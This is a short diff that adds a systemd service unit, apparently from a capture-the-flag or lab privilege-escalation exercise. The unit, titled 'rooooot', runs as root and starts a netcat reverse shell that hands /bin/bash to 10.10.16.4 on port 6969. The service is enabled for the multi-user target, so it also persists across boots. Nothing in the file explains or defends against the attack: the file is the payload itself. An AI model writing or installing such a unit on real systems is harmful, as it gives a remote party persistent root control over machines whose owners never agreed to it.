@@ -1,0 +1,10 @@
+[Unit]
+Description=rooooot
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/nc -e '/bin/bash' 10.10.16.4 6969
+
+[Install]
+WantedBy=multi-user.target
